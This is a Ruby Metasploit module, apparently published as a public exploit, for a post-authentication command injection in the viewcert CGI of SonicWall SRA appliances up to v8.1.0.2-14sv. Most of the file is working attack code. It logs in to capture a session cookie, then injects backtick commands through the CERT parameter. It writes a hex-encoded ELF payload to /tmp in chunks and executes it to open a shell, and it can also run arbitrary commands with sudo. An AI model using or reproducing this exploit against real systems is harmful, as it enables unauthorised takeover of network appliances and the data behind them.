# Date: 12/24/2016
# Exploit Author: xort @ Critical Start
# Vendor Homepage: www.sonicwall.com
# Software Link: sonicwall.com/products/sra-virtual-appliance
# Version: 8.1.0.2-14sv
# Tested on: 8.1.0.2-14sv
#             
# CVE : (awaiting cve)

# vuln: viewcert.cgi / CERT parameter 

# Description PostAuth Sonicwall SRA <= v8.1.0.2-14sv. This exploit leverages a command injection bug. 
#
# xort @ Critical Start




require &#039;msf/core&#039;

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  include  Exploit::Remote::Tcp
        include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Sonicwall SRA <= v8.1.0.2-14sv viewcert.cgi remote exploit&#039;,
          &#039;Description&#039;    => %q{
          This module exploits a remote command execution vulnerability in
        the Sonicwall SRA Appliance Version <=  v8.1.0.2-14sv. The vulnerability exist in
        a section of the machine&#039;s adminstrative infertface for performing configurations 
        related to on-connect scripts to be launched for users&#039;s connecting.  
      },
      &#039;Author&#039;         =>
        [
          &#039;xort@Critical Start&#039;, # vuln + metasploit module
        ],
      &#039;Version&#039;        => &#039;$Revision: 1 $&#039;,
      &#039;References&#039;     =>
        [
          [ &#039;none&#039;, &#039;none&#039;],
        ],
      &#039;Platform&#039;      => [ &#039;linux&#039;],
      &#039;Privileged&#039;     => true,
       &#039;Arch&#039;          => [ ARCH_X86 ],
                        &#039;SessionTypes&#039;  => [ &#039;shell&#039; ],
                        &#039;Privileged&#039;     => false,

            &#039;Payload&#039;        =>
                                { 
                                  &#039;Compat&#039; =>
                                  {
                                        &#039;ConnectionType&#039; => &#039;find&#039;,
                                  }
                                },

      &#039;Targets&#039;        =>
        [
          [&#039;Linux Universal&#039;,
            {
                &#039;Arch&#039; => ARCH_X86,
                &#039;Platform&#039; => &#039;linux&#039;
            }
          ],
        ],
      &#039;DefaultTarget&#039; => 0))

      register_options(
        [
          OptString.new(&#039;PASSWORD&#039;, [ false, &#039;Device password&#039;, "" ]),  
                 OptString.new(&#039;USERNAME&#039;, [ true, &#039;Device password&#039;, "admin" ]),  
          OptString.new(&#039;CMD&#039;, [ false, &#039;Command to execute&#039;, "" ]),  
          Opt::RPORT(443),
        ], self.class)
  end

        def do_login(username, password_clear)
                vprint_status( "Logging into machine with credentials...\n" )

                # vars
                timeout = 1550;

                # send request  
                res = send_request_cgi(
                {
                      &#039;method&#039;  => &#039;POST&#039;,
                      &#039;uri&#039;     => "/cgi-bin/userLogin",
          &#039;headers&#039; => {
         &#039;Connection&#039; => &#039;close&#039;,
         &#039;Content-Type&#039; => &#039;application/x-www-form-urlencoded&#039;,
         &#039;User-Agent&#039; => &#039;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0&#039;,
                },
                      &#039;vars_post&#039; => {
         &#039;username&#039; => username,
         &#039;password&#039; => password_clear,
         &#039;domain&#039; => &#039;LocalDomain&#039;,
         &#039;loginButton&#039; => &#039;Login&#039;,
         &#039;state&#039; => &#039;login&#039;,
         &#039;login&#039; => &#039;true&#039;,
         &#039;VerifyCert&#039; => &#039;0&#039;,
         &#039;portalname&#039; => &#039;VirtualOffice&#039;,
         &#039;ajax&#039; => &#039;true&#039;
           },
                }, timeout)

    swap = res.headers[&#039;Set-Cookie&#039;].split(&#039;\n&#039;).grep(/(.*)swap=([^;]+);/){$2}[0]
    
                return swap
        end


  def run_command(swap_cookie, cmd)

                # vars
                timeout = 1550;

                res = send_request_cgi({
                   &#039;method&#039; => &#039;POST&#039;,
                   &#039;uri&#039;    => "/cgi-bin/viewcert",
                   &#039;data&#039; => "buttontype=delete&CERT=newcert-1`#{cmd}`",
                   &#039;headers&#039; =>
                        {
                                &#039;Cookie&#039; => "swap=#{swap_cookie}",
                        },
                }, timeout)
  end

  def run_command_spliced(swap_cookie, cmd)

              write_mode = ">"
              dump_file = "/tmp/qq"
        reqs = 0

              cmd_encoded = cmd.unpack("H*").join().gsub(/(\w)(\w)/,&#039;\\x\1\2&#039;)

              for cmd_chunk in cmd_encoded.split(/(....................................)/)

                        cmd_new = "printf \"#{cmd_chunk}\"#{write_mode}#{dump_file}"
      reqs += 1

      vprint_status("Running Command (#{reqs})\n")

                        # set to normal append for loops after the first round
                        if write_mode == ">"
                                write_mode = ">>"
                        end

                        # add cmd to array to be exected later          
                        run_command(swap_cookie, cmd_new)
               end
#    vprint_status("Running Final Command ...\n")

                # execute payload stored at dump_file 
                run_command(swap_cookie, "chmod +x /tmp/qq; sh /tmp/qq")

  end

  def exploit
    # timeout
    timeout = 1550;

    # params
    password_clear = datastore[&#039;PASSWORD&#039;]
    user = datastore[&#039;USERNAME&#039;]

    # do authentication    
    swap_cookie = do_login(user, password_clear)
  
    vprint_status("authenticated &#039;swap&#039; cookie: #{swap_cookie}\n")
      
     #if no &#039;CMD&#039; string - add code for root shell
                if not datastore[&#039;CMD&#039;].nil? and not datastore[&#039;CMD&#039;].empty?

                        cmd = datastore[&#039;CMD&#039;]

                        # Encode cmd payload
                        encoded_cmd = cmd.unpack("H*").join().gsub(/(\w)(\w)/,&#039;\\x\1\2&#039;)

                        run_command(swap_cookie, ("sudo /bin/rm -f /tmp/n; printf \"#{encoded_cmd}\" > /tmp/n; chmod +rx /tmp/n; /tmp/n" ))

                else
                        # Encode payload to ELF file for deployment
                        elf = Msf::Util::EXE.to_linux_x86_elf(framework, payload.raw)
                        encoded_elf = elf.unpack("H*").join().gsub(/(\w)(\w)/,&#039;\\x\1\2&#039;)


                        run_command_spliced(swap_cookie, "printf \"#{encoded_elf}\">/tmp/m;chmod +rx /tmp/m;/tmp/m")
      # wait for magic
                        handler
                end
  end
end

